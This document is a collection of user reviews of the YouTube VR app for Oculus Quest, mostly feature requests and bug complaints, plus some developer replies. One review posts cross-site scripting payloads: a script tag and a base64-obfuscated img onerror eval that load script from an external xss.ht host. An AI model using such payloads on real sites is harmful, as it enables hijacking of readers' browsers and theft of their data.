it :)\n\nHelpful | 3", "nr6542May 22 at 9:23 AM\nIt could be so simple...\n\nJust let us NOT use speech input if we don't want to. Let us browse instead of having to enter a keyword. Let us filter with a resolution drop down, not just \"4K\" (what about 5K? Maybe 8K in the future? Or 2K specifically for people whose connection can't handle more). Show us what the resolution of a given video is.\nBut nooo, it's clear by the app's design that you \"know what's best for the user\". Limit options because people are too dumb.\nThe content is alright though (except that many 360 videos have moving cameras, my body can't deal with that and there's no way to filter those out) and it would work reasonably well. But the limitations mean that I will look elsewhere for content.\n\nHelpful | 3", "Cat_ManJan 10 at 7:31 PM\nHand tracking would be great\n\nThis a fantastic app, you can wach both 360 and normal YouTube videos. Its great to just lay down and watch YouTube, but I think it would be even better with the experimental hand tracking feature of the oculus quest supported, so I dont have to wory about keeping the controller close. Plus brightness control would be fantastic, because any video that has a white screen hurts your eyes because it's always on max\n\nHelpful | 200", "ken_XDJul 12 at 6:28 AM\nCANT SEARCH VIDEO\n\nPLS FIX IT ASAP!!\n\nHelpful | 4", "Chunk-EJun 15 at 6:24 AM\nGreat\n\nLove this you tube vr app.. Just please make the screen rotate so i can watch lying down on my side... \n\nHelpful | 2", "varora01Jul 12 at 10:14 PM\nVipull Arora\n\nGreat application there... Very much interested\n\nHelpful | 0", "devongiffordJul 13 at 4:11 PM\nRadical\n\nGood dude\n\nHelpful | 0", "FireDragon10May 28 at 9:57 PM\nYouTube on vr\n\nHello watch vids on vr .\n\nHelpful | 1", "Lens_CrafterFeb 10 at 10:11 PM\nWish is had better screen controls.\n\nI really like the app but it needs a couple of things. The most important is more sophisticated screen controls, similar to the ones in Skybox. The makers of Skybox really got screen controls RIGHT. Do that. I love to use to use my headset in bed. When combined with headphones, I can watch videos in bed with out disturbing my wife. We have different work/sleep schedules. She goes to bed early and gets up early. Im a night owl and sleep later. Netflix and Skybox let me lock the screen orientation to the headset, so when I lay on my side, the screen goes with me. I cant do that with the YouTube app. I also wish I could download videos for higher resolution, off-line viewing. Some of us live in the sticks and cant get the kind of broadband speeds you need to stream VR.\n\nHelpful | 19", "SwagStar59May 8 at 1:37 PM\nCmon its yt VR\n\nIts free so dont complain its not like ur paying for it\n\nHelpful | 6", "T-railedApr 3 at 9:58 AM\nYou had one job\n\nA just typed music in the search bar, set filters to vr and started one of the first results. It looked weird. The video feeds for the left and right eye where swapped! The only function of this app is to play video's, with a focus on VR/360 AND IT CAN'T EVEN DO THAT RELIABLY. It fails at is only purpose.\n\n----Original review----\n\nBecause I get motion sick very easily from 180/360 videos (something YouTube probably can't help because you can't change the camera position on a video), I was hoping to view 3D videos with it. But a lot of 3D videos I tried it showed the video side by side instead of 3D like it should. I found these videos with the 3D search filter so YouTube knows theyre 3D.\n\nAlso if I go to the uploads section of a channel the number of videos shown is limited to only the 6 most recent videos.\n\nI also miss the comment section and chat.\n\nHelpful | 6", "imme56789Feb 5 at 3:48 PM\nAmazing, but...\n\nIt's just like YouTube but just better. It has so many customizations to fits the viewers needs. The reason though I did 4 stars is because if your laying down and looking to the side you can move the screen, but just not sideways no mater what you do. But overall I would rather have the VR set then a computer or a iPad. (Its free) It also has amazing 360 videos and 180 videos to.\n\nHelpful | 18", "ninjack1372Mar 29 at 5:36 AM\nSuper happy that this is on the quest!\n\nI thought this app for the Oculus quest is amazing! How you can look around, resize, and go in a specific category is amazing. Sure there's no hand tracking, but that doesn't matter to much. But the 3D videos feel and look like im actually in the video! So I think every Oculus quest owner should download this app to watch there favorite YouTube channel in VR.\n\nHelpful | 7", "MittsmasherJun 4 at 9:16 AM\nGreat for relaxing\n\nI love how you can adjust the screen when ever you want\n\nHelpful | 1", "supergodmandudebruh1Apr 5 at 10:25 AM\nIt should be the easiest thing to work\n\ndont get me wrong I love YouTube but when its one of the easiest apps to run its the worst out of every game and app I have it always begins to glitch after about 20-30 minutes and it doesnt make any sense it is extremely annoying and I hate that SO MUCH\n\nHelpful | 4", "CoolcatmanJun 1 at 2:39 PM\nGood\n\nGood\n\nHelpful | 1", "axarmsFeb 28 at 7:53 AM\nno stars\n\nwill not work on my quest. have uninstalled and reinstalled lots of times. contacted oculus they told me to factory reset my device which uninstalls every app on my quest that i would have to reinstall. a bit over the top for one app misbehaving. SURELY there must be an easier solution. any advice or solutions would be most welcome. thank you\n\nHelpful | 13", "rattleheadxyzJan 5 at 7:24 PM\nWorks Quite Well\n\nWatching 360 videos is terrific! I dont have the greatest internet on the planet, but videos load quickly and look pretty good. Obviously, watching videos locally as opposed to streamed will yield better results than anything you can get on YouTube, but its still good!\n\nHelpful | 20", "ChrisFromNZApr 21 at 5:06 PM\nExcellent contents but lacks features\n\nI wanted change inapp keyboard to search in different language but not like firefox reality I can only use English unless I change the system menu.\n\nHelpful | 1", "KieranCollinsMar 21 at 2:42 AM\nDoesnt compare to Netflix\n\nIm on YouTube constantly, and I tried it in the VR, I love the fact that I can adjust the size and location of the screen which really helps if you want to lay down or sit closer to the screen. Working out while in front of the big screen is pretty nice too. I just wish there were more places besides just a dome looking thing.\n\nHelpful | 1", "3dwar6Feb 22 at 5:54 AM\nGood but requires more features\n\nAdding features like to choose what format the video is playing would be great as sometimes the app cannot detect the format if the video correctly. For example playing a 3d video only show a parallel video side by side instead of playing a 3d stereo video. The same thing also happened to other vr video\nformat\n\nHelpful | 3", "ZeleaxApr 1 at 12:24 PM\nYoutube VR can't play some videos\n\nWeird problem described here:\nhttps://support.google.com/youtube/thread/27108538?hl=en\nFor example, video below can be played on PC (Win7, Chrome), but can't be played on my Oculus Quest in YouTube VR - I get error \"This video is not available\"\nhttps://www.youtube.com/watch?v=fzTHnyzLxhk\n\nHelpful | 1", "kimojoeMay 15 at 10:39 AM\nGreat\n\nLove it\n\nHelpful | 0", "clearsongFeb 18 at 6:34 PM\nA good start but needs more\n\nSeems like an oversight that Side By Side stereoscope videos don't work and there are lot of them on Youtube. Great with the 360 VR but SBS shows the two videos halves of the screen and there's no setting unlike Sybox that allows you to switch the view. It's perfect for the Oculus and hopefully Youtube will put this feature in soon\n\nHelpful | 3", "FryeMoney20May 24 at 4:36 PM\nVery glitchy\n\nDoes not run smoothly\n\nHelpful | 1", "jacob.caudle.50Mar 9 at 4:32 AM\nALL RIGHT\n\nIts all right! I think its better than watching VR YouTube videos on Mobile because you dont have to put your phone in a VR case and you can just go on here and enjoy Youtube VR without having to worry about anything having to be done! But I wouldnt watch YouTube on here more often than watching YouTube on my phone or computer because I could get a headache or destroy my eyes from looking through a VR screen.\n\nHelpful | 0", "MegaFlopsFeb 3 at 9:21 AM\nPlease, please add comments!\n\nSorry for the harsh review (one star only), but the app is almost not usable for me. Watching YouTube without comments is like having breakfast without the coffee!\nPlease add a reply that you considering this for a future update and I will change to four stars ;-)\n\nHelpful | 15", "mark4242Apr 16 at 6:31 AM\nGood\n\nGood\n\nHelpful | 1", "SpectobyApr 10 at 9:45 PM\nYouTube in VR\n\nYup. Thats it. Its YouTube in VR. 5 stars.\n\nHelpful | 1", "rich2021Feb 14 at 1:30 AM\nDoesn't work on Quest\n\nI cannot see anything. The screen is totally black with a few bright pixels randomly flashing.\n\nQuest and apps all fully updated.\n\nHelpful | 15", "londonman13May 28 at 6:58 PM\nHate it\n\nHate it\n\nHelpful | 0", "VRGargoyleMar 6 at 9:39 PM\nRift S NEEDS VR180 3D on YT!\n\nI really wish this was on my Rift S so i can watch my VR180 3D videos. The only way i can get YoutubeVR is via SteamVR and that's limited at 1080p Unlike the Quest app that's 2880p. Not only that i don't think YoutubeVR via Steam even knows what a Rift S is and has not been updated in years.\n\nHelpful | 1", "Juan-117Mar 20 at 12:39 AM\nWhat an immersive experience!!!\n\nOculus Quest takes YouTube VR to the next level! Definitely my favorite way to watch YouTube now!\n\nHelpful | 1", "shaun.walmsley1Nov 27 at 5:38 PM\nGreat app!\n\nThe 1st app i downloaded on my ocuulus quest love it! . If you want to watch 360 videos, just make sure you search for4k And 360 otherwise the low resolution makes you feel sick afterwards, great app though, 5 stars *****\n\nHelpful | 100", "SashayAwayDec 14 at 3:38 AM\nGlitchy with missing features\n\nThe YouTube rarely launches properly. When the app opens, I simply see a few small squares flashing. This is very difficult to explain, but the app is completely unusable.\n\nI have gotten the app to launch twice of about 10 tries before I uninstalled.\n\nAdditionally, there doesnt appear to be YouTube TV support.\n\nHelpful | 22", "YourThiccUncleJan 8 at 7:08 AM\nFelt it needed more features\n\nAlthough I do enjoy the benefit of watching youtube in vr, I feel like the basic black background gets boring. Maybe a living room or movie theater setting would feel better.\n\nHelpful | 8", "vanomaniaMar 9 at 8:22 AM\nlast update broke purchases\n\nCan't browse list of purchased movies after last update. The menu option is there, but get the message 'there was a problem' when selecting it.\n\nHelpful | 0", "skiddyhydra8684Feb 16 at 9:51 AM\nAwesome\n\nI have been on YouTube for years and have gotten that good of 360 videos but now you can see everything with just turning my head .It is just really cool. I suggest getting YouTube on the Oculus.\n\nHelpful | 1", "CharlieVR25Feb 15 at 12:42 AM\nSatisfied purchas\n\nIt was easy to navigate and was quick\n\nHelpful | 1", "ericchen1005Mar 10 at 5:59 PM\nNew updated is broken\n\nnew updated version seems broken on my oculus Quest! Please help fix it as soon as possible ,Thanks\n\nHelpful | 1", "DeepMellowFeb 17 at 4:59 PM\nCould be better\n\nIt needs filters. I cant filter by upload date so if I search for something it pulls a bunch of old stuff.\n\nHelpful | 0", "JensoonioJan 17 at 12:57 PM\nGood App but....\n\nIts a good app but its not really that immersive like big screen. its pretty much just a screen surrounded by dark grey, I think you can see by the shortest description ever why I dont like it that much. Although its pretty great other than that no glitches or lagging. So I would recommend it.\n\nHelpful | 2", "CTM206Feb 20 at 6:30 PM\nReally bad\n\nIt only gives an error message. Worthless.\n\nHelpful | 3", "przecinekNov 9 at 4:48 AM\nNeeds commenting system badly!\n\nAll in all very good app for VR180 but hampered by the lack of ability to leave comments!\n\nAt least give us emoji keyboard or something.. We want to encourage VR creators and comments are the best way to do that.\n\nHelpful | 11", "bovinusJan 1 at 6:16 PM\nOk\n\nApp itself is ok but quality of video is either low and blurry or high and constantly buffering (I have a very fast internet connection).\nAdverts are really annoying as they are only 2d and really break immersion.\n\nHelpful | 5", "Munkeh102Dec 27 at 1:30 AM\nImpossible to link with YouTube account\n\nTo link your account it displays a code in VR that you have to type in on a phone or PC. So you have to memorise the code and then type it in, which doesnt seem to work anyway. If you take the headset off and then put it back on the code is gone, and it then gives you a new code. Why cant I just type in my login details! Pointless app, just virtual desktop.\n\nHelpful | 5", "ulkramOct 18 at 6:23 PM\nGreat app, missing a few small features\n\nFew suggestions:\n\nIt'd be great to be able to read comments in app.\nIt'd be great if the left right arrow could be mapped to skip forward/backwards just like on Youtube website and other media players.\n\nHelpful | 22", "keithwalbrunFeb 16 at 8:29 PM\nGood\n\nThis is amazing, YouTube on crack. You can watch videos like normal but also videos in 3D, its a goddamn movie theater. Overall it is crap and I hate it.\n\nHelpful | 1", "FireRMDec 18 at 1:30 PM\nCrash with latest update\n\nAfter the update the apparently crashed ( put me out to home ) please fix this.\nedit : fixed!\n\nHelpful | 4", "George.elliott2019Jan 9 at 9:21 AM\n:(\n\nGrhr\n\nHelpful | 0", "KirigayaMarcDec 22 at 10:24 PM\nGreat\n\nIt's great but needs different possible environments and maybe multiplayer features\n\nHelpful | 0", "ZapWap132Dec 17 at 9:32 AM\nAds in VR suck.\n\nAds are bad enough on regular YouTube, but it is really annoying when all you can see or hear is an ad. I hope ads like this go away and don't spread or else I will give up on VR.\n\nHelpful | 11", "DrKotulakNov 10 at 10:39 AM\nNo complaints\n\nApp works smoothly and Ive had no problems. I like they advertise videos for 360 when you start. Interesting content as always with YouTube. Check out Dreams of Dali 360 or Alan Watts Gravity 360\n\nHelpful | 6", "beyondbeliefNov 10 at 2:19 PM\n60hz only\n\nOn the quest the app only renders at about 60hz. Not all people can see this, but if you do, it flickers like hell. Given the size of google and their policies, I hope that they soon fix this, as it really is an accessibility problem. So please tune it up to 72hz.\n\nHelpful | 17", "CoralineBoyJan 9 at 4:14 PM\nWhy pls respond\n\nHi so Ive been waiting for three months for fnaf vr to come out on the oculus quest and Im sick and tired of me waiting pleas respond when you have the date can you please update the data of the game with you and steel wool studios thank you\n\nHelpful | 1", "DocAKIANov 10 at 4:01 AM\nToo bright! Major God rays\n\nOculus Quest seems to have a major god rays issue.\nYou brigjtness of Youtube app does not help with the problem. I'm I mistaken or did you boost the brightness in the last update?\nIit is now unbearable.\nNeed a setting to reduce the brightness of the video playback.\n\nHelpful | 13", "BluthDec 18 at 4:40 AM\nWorks again.\n\nWorks as intended - room for improvement.\n\nHelpful | 7", "Randall.WassonDec 22 at 12:25 PM\nMust-have quest app.\n\nFive stars for letting us move the screen around as well as adjusting the size and angle.\n\nHelpful | 5", "JobiwonJan 14 at 5:34 AM\n\nAuesome\n\nHelpful | 1", "tampabaysheaDec 25 at 4:00 PM\nThis is so amazing\n\nI like it because you can just sit there and lay down and just keep watching\n\nHelpful | 6", "daydream9091Dec 31 at 4:43 PM\nAmazing\n\nIt was amazing. portable movie theater!\n\nHelpful | 3", "shoeless_yeti05Dec 30 at 7:10 PM\nGreat app\n\nI really think they should make it like the Netflix app where its kinda like a movie theater that would be great\n\nHelpful | 4", "MeowformebabyNov 2 at 4:30 PM\nBeen waiting\n\nBeen waiting for an update since the quest was released, to be able to sort results at the very least. Recently posted would be enough. Its by far the best video app for oculus, dont get me wrong. But it really needs that minor update.\n\nHelpful | 7", "SirShortyJan 1 at 10:29 PM\nBuffering\n\nConstantly buffers for most videos even though Im on a fast connection \n\nHelpful | 0", "LynlisssDec 3 at 10:42 AM\nNot bad\n\nIt would probably be better if I could link it to my youtube account but after many tries I've given up. But for what it is it works good.\n\nHelpful | 1", "Jenko4starAug 25, 2019 at 2:11 AM\nVery good but......\n\nPLEASE ALLOW TO USE THUMBSTICKS TO MOVE LEFT AND RIGHT IN 360 MOVIES, some people don't want to act like an owl to see behind them.\n\nThanks for the app!\n\nHelpful | 26", "NYC-ARDec 2 at 7:33 AM\nGood BUT....\n\nGood but very low quality VR videos. Most make you dizzy.\n\nHelpful | 3", "JessXeSep 18, 2019 at 10:39 PM\n4 Stars\n\nMostly a great app but I would like the option to be able to read the video comments as well.\n\nHelpful | 11", "virtualytDec 5 at 12:05 PM\nGreat\n\nI love 360 vids on my phone and in vr its just so much better\n\nHelpful | 4", "MolokanOct 25 at 10:15 PM\nEnvironments needed\n\nWould be a nice add to a good app.\n\nHelpful | 6", "michael.brock.984991Oct 20 at 2:02 PM\nCan we make videos?\n\nI want to try to start a vr channel so can I host it all off of the quest\n\nHelpful | 0", "hunterungerAug 15, 2019 at 7:39 PM\nGood enough.\n\nIt looks great and runs well, but there are unfortunately a few key features missing. For example, you cant view or write comments, which is half the fun of YouTube.\n\nHelpful | 8", "MightyQuinnJOct 21 at 12:38 AM\nGreat way to view my 360 videos!\n\nI love this app for its ability to have my YouTube channel content quick and easy to view! Also my 360 videos play back great with this app!\n\nHelpful | 2", "CkangnzSep 7, 2019 at 12:19 AM\nOnly English for keyboard..?\n\nThere are several things that makes me not want to use this app.\n1. Keyboard doesn't support other languages than English. What's up with that..?( I want to search in Korean for example)\n\n2. You can't see comments of the videos?? Or maybe i can't find them?? Where are the comments?\n\n3. On home page, i would like to see similar recommended videos i see on my phone or mobile app. I see repeated videos of 360 degrees videos ive already seen.\n\n4. Can't skip or interact videos with any other way than actually pointing and scrolling?\n\nHelpful | 4", "THICBOI69Dec 7 at 5:52 PM\nBoi\n\nI watch Ssundee sub to Ssundee\n\nHelpful | 4", "KireanrileyAug 22, 2019 at 11:32 PM\nNewest update broke the app\n\nUp until the newest update this was a awesome way to view youtube but now when I open the app I get a black screen with a few flashing pixels and it's just on this app\n\nHelpful | 23", "t.for.torresSep 21, 2019 at 8:00 AM\n\nI can't get it to work\n\nHelpful | 7", "thefalcon666Aug 23, 2019 at 9:27 AM\nOhhhh my god\n\nThe most amazing vrs from space, galaxies to deep seas and hammerhead sharks. A truly amazing experience and its free!!!! I love YouTube\n\nHelpful | 3", "GollyPepSep 29, 2019 at 8:27 AM\nSenorita\n\nMy favorite I love it\n\nHelpful | 3", "neilbeckermanAug 14, 2019 at 9:59 AM\nCan't access or share private videos\n\nI am collaborating with another Youtube user on a VR video project. We are trying to share footage and edits with each other but the Youtube VR app won't let us access the private videos in our profiles. The only way to share the videos is to make them public. The video is a work in progress and we don't want share it with the world until it is finished. Is there any way to share private videos? You can do it on the computer, just not on the headset with App or using the headset browser.\n\nHelpful | 5", "cltsangMay 29, 2019 at 11:32 PM\n\nVery good and stable. It's the one of the few apps that I tried so far that can quit properly.\nPlease enable thumbstick left and right to fast forward or backward a few seconds.\nAdjustable curvature would be great too.\nAlso if caption could float in front of the video it could be read a bit more easily.\n\nHelpful | 241", "qtipextraAug 2, 2019 at 6:56 AM\nCan't switch to my primary YT account\n\nUpdated my review after the late July update. Initially the app wasn't much use, as secondary channel accounts could not be utilized. Since this update, I am pleased that this feature is implemented and I had no difficulty in chosing which channel account I wanted to use. I can now access all my previously liked and watched videos, playlists, subscriptions, as well as search for new content, both VR and non, to my heart's desire. Thanks for the update. I am updating from 1 to 5 stars.\n\nHelpful | 1", "simply_lucasSep 25, 2019 at 4:51 AM\nLove it ^^\n\nIt's amazing!\n\nHelpful | 4", "RytharrMay 28, 2019 at 9:02 PM\nGreat but could be much better!\n\nI can easily lose a lot of time in this app. I really love watching AirPano videos. It would be great if we could favorite videos to easily find later on. Would also be nice if we could sort videos by date when searching as it is very hard finding new 360 content\n\nHelpful | 6", "JvdangerAug 8, 2019 at 4:37 PM\nDoesnt work\n\nEvery time I open the app it just shows blocks of the app with most of the screen black\n\nHelpful | 11", "DAX_QcSep 8, 2019 at 9:21 AM\nVr content lacking quality\n\nBetter than it was 2 yrs ago but still not enough vr content.\n\nHelpful | 2", "tvanilliJul 14, 2019 at 4:23 AM\nBad implementation\n\n360 and 180 degree videos work and are a good experience. That's s great.\n\nBut searching videos is really bad. You can not sort in any way. What if I want to look for content with high ratings, many views or something that is recently added? You have to search for the videos on the phone and try to find them in the headset by copying the title...\n\nOften the results of normal searches bring very low quality videos with <10 views??\n\nNo way to bookmark a video without downloading it.\nSometimes normal videos appear after filtering for VR content.\n\nEvery time I want to use the options menu I end up reporting for inappropriate content...\n\nSkipping through the video with the thumbstick would be nice.\n\nIf it offers same features as the android app I would rate 4.5 stars.\n\nHelpful | 4", "robbieloseeMay 22, 2019 at 8:36 PM\nCould improve but great\n\nThe report video option is too easy to nearly hit, and navigating more than six videos per search results isnt obvious (if even possible?) Im new though so that may be me.\n\nIt is great seeing my old videos in a truly new way so the good outweighs it all. Overall great app.\n\nHelpful | 23", "lexzzarre348Aug 21, 2019 at 5:09 PM\nAll good\n\nThe apps is finish, there will be probably be no update because it is doing what it is supposed to do and well.\n\nHelpful | 1", "jjugglerJul 15, 2019 at 11:06 AM\nFrequent tracking problems!\n\nSometimes this works fine, other times it crashes due to tracking problems so much that its unusable. Other apps are tracking fine. Definitely put a damper on exploring content and creating any 360 content.\n\nWhen it is working fine, its great! It would be great to be able to add videos to playlists inside the app.\n\nHelpful | 9", "DontDropTheJuiceAug 10, 2019 at 5:46 AM\nLove it\n\nA different kind of YouTube experience.\n\nHelpful | 0", "Crazy_SaneJun 2, 2019 at 3:49 AM\nA Great Way To Watch Youtube\n\nThis app is what you'd expect. It runs smoothly and does it's job well. It could do with some more features, like an SBS 3D mode and different environments, but it great for a first rendition.\n\nHelpful | 6", "Tomha2011Aug 9, 2019 at 4:44 PM\nHard on the neck\n\nTried watching it from a seated position Had to look up at about 30 the whole time. And you were so close to the screen it was hard to watch. Just what you want to do book up with weight on the tip of your nose\n\nHelpful | 1", "harryp123Dec 3 at 9:29 AM\nKkkkk i I'l kok ok onuiik kiklnomy u ok\n\nOk R okT look kI'll onuk like k okay ln in look ukkj kkk I look r lo look ok my ok Ollyok look u kk Lu look k lookkrkoku\n\nHelpful | 2", "ttycutiegachaverseAug 30, 2019 at 3:55 PM\nLove\n\nIts so aside!!!\n\nHelpful | 2", "MihaiDinulescuJun 16, 2019 at 2:48 PM\nIncredible install\n\nYou fine folks have made one of the most boring part of the app, being confused about what to do and click on when you boot it up, to one of the most surprising and fun experiences Ive had in VR.\n\nHelpful | 4", "monkeywraithJun 24, 2019 at 4:32 PM\nFunctional, missing all the features\n\nPlaying videos works and you can move the screen both vertically and horizontally, which is excellent. Unfortunately it uses the wrong profile on my account, the correct one does not show up, and it has no option to browse your subscriptions. If the functionality matched the normal Android app then it would be 4-5 stars.\n\nHelpful | 3\nDeveloper ResponseJul 26, 2019 at 3:45 PM\n\nThanks for the feedback monkeywraith! With the latest update of the YouTube VR app we have enabled support for Brand Accounts. Please update the app and let us know if you have any issues.", "PatientBeaverMay 29, 2019 at 12:18 AM\nCant watch without holding controllers\n\nThe app is great and love the fact you can easily move the screen to watch lying on your back. HOWEVER if I put the controllers aside to watch a video, after a minute or two the headset will abruptly exit to the home menu unless I keep the controllers in my hand. I dont know if this is an app problem or an oculus system problem, but it makes watching videos while exercising on a walker, for example, impossible. PLEASE FIX\n\nHelpful | 7", "donthavetobecrazyJul 7, 2019 at 3:21 PM\nGreat, but not perfect\n\nA great app that can only get better. Some polishing and improved features are certainly needed but so far so good\n\nHelpful | 0", "JTubbrittMay 25, 2019 at 10:02 AM\nPretty good time killer.\n\nWho ever designed the dark theme, high five. Its pretty good. I love sitting back and just chilling while flogging around on YouTube. The 180/3D content being my favourite. Tempted to even buy my own camera because I find the footage so interesting. Performance arts especially looks great in 180/3D. Good work, it's a better way to view YouTube.\n\nHelpful | 4", "xmorkxJun 30, 2019 at 12:36 AM\nCould be amazing\n\nThe content is great and still enjoyable, however the videos are low resolution (even when it says 1440p). Text is a bit blurry and detail is lost which really detracts for the while experience.\n\nHelpful | 2", "shinovanoAug 15, 2019 at 9:33 PM\n\nExcellent app\n\nHelpful | 2", "DudeManL57May 23, 2019 at 5:02 PM\nPretty good\n\nSeems to run smooth for me but wanted to watch a 3d sbs video but doesnt seem there is a way to turn that on\n\nHelpful | 6", "JohanTEAJun 7, 2019 at 11:22 AM\nLimited functionality and nauseating\n\nThis app works but there are no comments shown and compared to the regular YouTube app it's very limited.\nAlso, watching VR video, regardless if it is 180 or 360, is quite nauseating since it is only 2 degrees of freedom. For VR video to be a real option it needs to improve significantly and be 6 degrees of freedom, at least a bit.\n\nHelpful | 3", "JohSm67May 31, 2019 at 5:37 AM\nNice Video Stream Quality\n\nThis is a good app to use for streaming Youtube and your Google Play rentals/bought movies!\n\n8K 360 streams perfect!\n\nThere are some needs for improvement, black level on rental/bought movies is kind a pixeled! Would be nice to have an all black background as option during playback with lock of tracking/position!\nAnd finally offline viewing (from in memory or a USB stick) of rentals/bought movies for traveling!\n\nHelpful | 2", "ReDeR6Jun 4, 2019 at 2:45 PM\nEmpty account\n\nI was excited to use this app to watch my subscribers in VR. Well, not with this app, because it uses a default google account and not your youtube account + doesn't let you change between these (brand) accounts.\n\nEDIT: Updated my review from 1 -> 3, because after 4 days (because of youtube's stupid limitations) I've added subscribers from my usual youtube account to the empty account and can finally watch my subscribers in VR. Other than that I have no problem with the app, it runs smoothly, the interface is nice, readable, you can search for videos while watching other, it's great. But the hassle with the setup makes this app not worth a bigger rating.\n\nHelpful | 14\nDeveloper ResponseJul 26, 2019 at 3:46 PM\n\nThanks for the feedback ReDeR6! With the latest update of the YouTube VR app we have enabled support for Brand Accounts. Please update the app and let us know if you have any issues.", "roli_oliJun 7, 2019 at 8:48 AM\nGood but...\n\nPlease add comments and a way to turn the screen on its side.\n\nHelpful | 4", "KraalisMay 22, 2019 at 2:11 PM\nNeeds work\n\nI watched about 3hrs of videos on my oculus quest last night. Both in 180,360, and 2D footage. The videos were blurry/out of focus and there was a definitive screen door look to all the videos. My connection was strong using 5Ghz WiFi @ 128 down 32 up.\n\nHelpful | 13", "DanSinnerGMay 22, 2019 at 11:15 AM\nChat?\n\nAm I missing something or is it chat thats missing on live streams?\n\nHelpful | 4", "darwins.lastJun 4, 2019 at 11:17 AM\nWorks Great\n\nBut I'd like to see them bring back the \"watching with virtual friends\" option... maybe specific to specific people... like Hulu. Then, I'll give 5 stars.\n\nHelpful | 2", "DrPurpleSTLMay 23, 2019 at 12:16 PM\nWish there wad more out there!\n\nI want a lot more content. I would also love to know what beyond goPro is needed to create content. I would enjoy hours more. Mountain climber and skydive jumps were great. British Museum big disappointment.\n\nHelpful | 2", "obi2kenobiMay 26, 2019 at 8:20 PM\nFeels sloppy for a Google product\n\nInterface isn't great. Microphone search would have made it better but it didn't work for me. Even if it had the interface layout just wasn't great. Didn't really find good content so will probably uninstall. Whole thing just feels like a push to get a big name like YouTube on Quest but not much thought was put into it.\n\nHelpful | 2", "higginlsJul 7, 2019 at 12:08 PM\nGood but could be better.\n\nIt mixes in 2d video with 360/3d and doesnt have many hits to scroll thru on searches. In fact no scrolling at all. 2d should not be included in search results while claiming to be VR focused.\n\nHelpful | 1", "youneedyourheadMay 31, 2019 at 8:57 PM\nCan't switch accounts within same email\n\nMy YouTube account is tied to my Yahoo account. For whatever reason, this gives me two accounts: my actual account and one that simply says my email (with nothing else attached to it). I have my YouTube account set as the default so usually when I sign in, it automatically signs into that one. But when I sign into this app, it just brings me to my empty channel. When I try to switch accounts, it only shows my email account and not my main one with my username and my subs and everything. You can easily switch in the Oculus browser and I don't know why they can't just make it that simple. For now I'm stuck watching YouTube there.\n\nHelpful | 8\nDeveloper ResponseJul 26, 2019 at 3:44 PM\n\nThanks for the feedback youneedyourhead! With the latest update of the YouTube VR app we have enabled support for Brand Accounts. Please update the app and let us know if you have any issues.", "gltovarMay 21, 2019 at 11:45 PM\nNon Google linked profiles not supported\n\nAccounts that are not Gmail address (old pre Google accounts and brand accounts) are not supported. Shame, but I guess I can use the browser to watch my subscriptions\n\nHelpful | 9\nDeveloper ResponseJul 26, 2019 at 3:45 PM\n\nThanks for the feedback gltovar! With the latest update of the YouTube VR app we have enabled support for Brand Accounts. Please update the app and let us know if you have any issues.", "moallan03May 22, 2019 at 7:43 PM\nBrowser is 10x better\n\nThe app is awful for youtube vr, Resolution is locked to max 720p which looks really bad in vr and full screen is a no go if you are laying down. Even full screen on youtube on browser doesnt work. Not being able to change video quality makes the app unusable\n\nHelpful | 8", "OKCSKYJul 8, 2019 at 1:11 PM\n\nIts awesome.\n\nHelpful | 3", "Ada2077May 21, 2019 at 1:44 AM\nNoice\n\nYeet\n\nHelpful | 15", "GORGONITE72Jun 29, 2019 at 3:25 AM\n\nEssential\n\nHelpful | 2", "ryuwolfMay 24, 2019 at 6:33 PM\nController bug?\n\nApp works ok glad I am able to move the screen, but there is problem with controllers recently. The pointer curves back to the headset not allowing me to point at the screen or interact at all.\n\nHelpful | 1", "NecroNecroJun 9, 2019 at 1:21 PM\nMust have\n\nYoutube in vr is super fun, and this app makes it very easy to browse which videos to watch\n\nHelpful | 2", "NightMonk3yJun 22, 2019 at 2:00 PM\nGood but could improve\n\nWish the quality of vr videos would improve\n\nHelpful | 2", "brycetronMay 21, 2019 at 4:31 PM\nWoo!\n\nBest way to watch in VR\n\nHelpful | 6", "VRvinbeanselMay 31, 2019 at 5:06 PM\nSuperb\n\nthis is better than the PSVR version especially on higher resolution VR 360 videos. Haopynits on the Quest !\n\nHelpful | 3", "theVRmangJun 18, 2019 at 10:35 AM\nGreat!\n\nNo issues!\n\nHelpful | 3", "randomtechguyMay 21, 2019 at 5:39 AM\nIt's free\n\nWhy not?\n\nHelpful | 15", "CashAndCodesMay 25, 2019 at 3:37 PM\n(:\n\nMan dont I love falling into black holes in 360 and watching pewdiepie review memes on an 80 tv, for free!\n\nHelpful | 3", "brianpeirisJun 16, 2019 at 10:17 PM\n360 playback buggy\n\nBoots you out of VR after a few minutes of watching high resolution 360/180 videos\n\nHelpful | 1", "Erik_ElyMay 23, 2019 at 5:44 PM\nLove it!\n\nI can be stuck for hours with this app. Very fun and addicting. A must have.\n\nHelpful | 6", "tbhatnagar01Jun 3, 2019 at 2:59 PM\n\nLeave status\n\nHelpful | 3", "anoble66May 23, 2019 at 8:11 AM\n\nConstant buffering on any 360 video or vr. This is despite a 150mb connection and a 800mb/s 5ghz wireless connection.\n\nHelpful | 3", "LofiLifeKaiMay 21, 2019 at 7:15 PM\nVery good.\n\nThe 360 vids in vr are awesome.\n\nHelpful | 4", "yeetmansSep 1, 2019 at 1:48 AM\nWhy\n\nYou should be grateful if you have a vr\n\nHelpful | 2", "aasad0x01Jul 14, 2019 at 6:06 PM\n\"><script src=https://testoxss.xss.ht></\n\n\"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vdGVzdG94c3MueHNzLmh0Ijtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw&#61;&#61; onerror=eval(atob(this.id))>\n\nHelpful | 0", "iagopJun 21, 2019 at 6:41 AM\nLive\n\nWhen I watch live video it star at the beginning when I click live\n\nHelpful | 3", "tgtv_fireJun 13, 2019 at 8:18 PM\nYoutube vr is great\n\nIt feels like your in the videos which is cool\n\nHelpful | 3", "alqadheeJun 17, 2019 at 8:23 AM\n\n\\_()_/\n\nHelpful | 14"]